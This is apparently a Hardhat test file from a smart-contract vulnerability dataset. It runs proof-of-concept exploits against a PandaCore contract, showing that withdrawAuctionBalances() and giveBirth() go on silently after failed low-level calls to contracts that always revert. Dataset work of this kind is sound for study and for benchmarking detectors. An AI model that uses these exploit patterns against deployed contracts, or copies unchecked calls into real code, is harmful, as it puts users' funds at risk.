const { loadFixture, mine} = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
const { getContractAddress } = require('@ethersproject/address')


describe("attack unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol", function () {

  let owner, amount;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    amount = ethers.parseEther("1.0");

    let ownerNonce = await owner.getNonce() + 1;
    let futureAddress = getContractAddress({
      from: owner.address,
      nonce: ownerNonce
    });

    await owner.sendTransaction({
      to: futureAddress,
      value: amount,
    });

    const PandaCore = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol:PandaCore");
    const contract = await PandaCore.connect(owner).deploy();

    const GeneScience = await ethers.getContractFactory("contracts/unchecked_low_level_calls/GeneScience.sol:GeneScience");
    const geneScience = await GeneScience.connect(owner).deploy();
    await contract.connect(owner).setGeneScienceAddress(geneScience.target);

    const PandaCaller = await ethers.getContractFactory("contracts/unchecked_low_level_calls/PandaCaller.sol:PandaCaller");
    const pandaCaller = await PandaCaller.connect(owner).deploy(contract.target);
    await contract.connect(owner).setCFO(pandaCaller.target);

    const MyERC721 = await ethers.getContractFactory("contracts/unchecked_low_level_calls/MyERC721.sol:MyERC721");
    const nft = await MyERC721.connect(owner).deploy();

    ownerNonce = await owner.getNonce() + 1;
    futureAddress = getContractAddress({
      from: owner.address,
      nonce: ownerNonce
    });

    await owner.sendTransaction({
      to: futureAddress,
      value: amount,
    });

    const SaleClockAuction = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol:SaleClockAuction");
    const saleAuction = await SaleClockAuction.connect(owner).deploy(nft.target, 10);

    ownerNonce = await owner.getNonce() + 1;
    futureAddress = getContractAddress({
      from: owner.address,
      nonce: ownerNonce
    });

    await owner.sendTransaction({
      to: futureAddress,
      value: amount,
    });

    const SiringClockAuction = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0x663e4229142a27f00bafb5d087e1e730648314c3.sol:SiringClockAuction");
    const siringAuction = await SiringClockAuction.connect(owner).deploy(contract.target, 10);

    return {pandaCaller, contract, saleAuction, siringAuction, nft}
  };

  it("exploit unchecked low level call vulnerability in function withdrawAuctionBalances()", async function () {
    const {pandaCaller, contract, saleAuction, siringAuction, nft} = await loadFixture(deployContracts);
    await expect(
      owner.sendTransaction({
        to: nft.target,
        value: amount,
      })
    ).to.be.revertedWith("I always revert!");

    await saleAuction.connect(owner).transferOwnership(contract.target);

    expect(await ethers.provider.getBalance(saleAuction.target)).to.be.equal(amount);
    expect(await ethers.provider.getBalance(siringAuction.target)).to.be.equal(amount);

    await contract.connect(owner).setSiringAuctionAddress(siringAuction.target);
    await contract.connect(owner).setSaleAuctionAddress(saleAuction.target);

    await expect(contract.connect(owner).withdrawAuctionBalances()).to.not.be.reverted;

    expect(await ethers.provider.getBalance(saleAuction.target)).to.be.equal(amount);
    expect(await ethers.provider.getBalance(siringAuction.target)).to.be.equal(0);

  });


  it("exploit unchecked low level call vulnerability in function giveBirth()", async function () {
    const {pandaCaller, contract, saleAuction, siringAuction, nft} = await loadFixture(deployContracts);
    await contract.connect(owner).setSiringAuctionAddress(siringAuction.target);
    await contract.connect(owner).setSaleAuctionAddress(saleAuction.target);
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);
    expect(await ethers.provider.getBalance(pandaCaller.target)).to.be.equal(0);
    await expect(
      owner.sendTransaction({
        to: pandaCaller.target,
        value: amount,
      })
    ).to.be.revertedWith("I always revert!");

    await expect(pandaCaller.withdraw()).to.not.be.reverted;
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);
    expect(await ethers.provider.getBalance(pandaCaller.target)).to.be.equal(0);

    await contract.connect(owner).init();
    await contract.connect(owner).unpause();

    await contract.connect(owner).createWizzPanda([1,1], 0, owner.address);
    await contract.connect(owner).createWizzPanda([2,2], 0, owner.address);

    await contract.connect(owner).breedWithAuto(2, 1, {value: amount});


    await mine(10000);

    // giveBirth function ends even when the call to the external contract fails
    await expect(pandaCaller.call(2, [3,3], [100,0]))
          .to.emit(contract, "Birth")
          .withArgs(owner.address, 3, 2, 1, [3,3]);

    // caller does not get the reward
    expect(await ethers.provider.getBalance(pandaCaller.target)).to.be.equal(0);

  });


});
